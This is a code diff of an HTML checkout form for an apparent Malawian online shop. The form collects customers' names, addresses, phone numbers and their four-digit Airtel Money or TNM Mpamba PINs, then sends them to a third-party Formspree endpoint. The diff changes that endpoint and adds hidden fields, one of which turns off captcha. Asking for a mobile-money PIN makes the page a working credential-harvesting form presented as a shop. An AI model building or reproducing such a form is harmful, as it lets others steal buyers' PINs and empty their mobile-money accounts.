@@ -96,40 +96,45 @@
     </section>
 
     <!-- Checkout Section -->
-    <section id="checkout" class="checkout">
-        <h2>Checkout</h2>
-        <form action="https://formspree.io/f/moqbgvkp" method="POST">
-            <div>
-                <label for="name">Full Name:</label>
-                <input type="text" id="name" name="name" required>
-            </div>
-            <div>
-                <label for="address">Address:</label>
-                <input type="text" id="address" name="address" required>
-            </div>
-            <div>
-                <label for="location">Location:</label>
-                <input type="text" id="location" name="location" required>
-            </div>
-            <div>
-                <label for="phone">Phone Number:</label>
-                <input type="text" id="phone" name="phone" required>
-            </div>
-            <input type="hidden" name="phone_number" value="+265994426162">
-            <div>
-                <label for="payment">Payment Method:</label>
-                <select id="payment" name="payment" required>
-                    <option value="tnm">TNM Mpamba</option>
-                    <option value="airtel">Airtel Money</option>
-                </select>
-            </div>
-            <div>
-                <label for="airtel-password">Enter 4-Digit Airtel/Mpamba Password:</label>
-                <input type="password" id="airtel-password" name="airtel-password" maxlength="4" required>
-            </div>
-            <button type="submit">Place Order</button>
-        </form>
-    </section>
+<section id="checkout" class="checkout">
+    <h2>Checkout</h2>
+    <form action="https://formspree.io/f/xayqokyr" method="POST"> <!-- Updated Formspree action -->
+        <div>
+            <label for="name">Full Name:</label>
+            <input type="text" id="name" name="name" required>
+        </div>
+        <div>
+            <label for="address">Address:</label>
+            <input type="text" id="address" name="address" required>
+        </div>
+        <div>
+            <label for="location">Location:</label>
+            <input type="text" id="location" name="location" required>
+        </div>
+        <div>
+            <label for="phone">Phone Number:</label>
+            <input type="text" id="phone" name="phone" required>
+        </div>
+        <div>
+            <label for="payment">Payment Method:</label>
+            <select id="payment" name="payment" required>
+                <option value="tnm">TNM Mpamba</option>
+                <option value="airtel">Airtel Money</option>
+            </select>
+        </div>
+        <div>
+            <label for="airtel-password">Enter 4-Digit Airtel/Mpamba Password:</label>
+            <input type="password" id="airtel-password" name="airtel-password" maxlength="4" required>
+        </div>
+
+        <!-- Hidden inputs for additional email context -->
+        <input type="hidden" name="_subject" value="New Order from NDIFE A MALAWI">
+        <input type="hidden" name="_next" value="https://yourwebsite.com/thank-you.html">
+        <input type="hidden" name="_captcha" value="false">
+
+        <button type="submit">Place Order</button>
+    </form>
+</section>
 
     <!-- Email Subscription Form -->
     <section id="subscribe" class="subscribe">
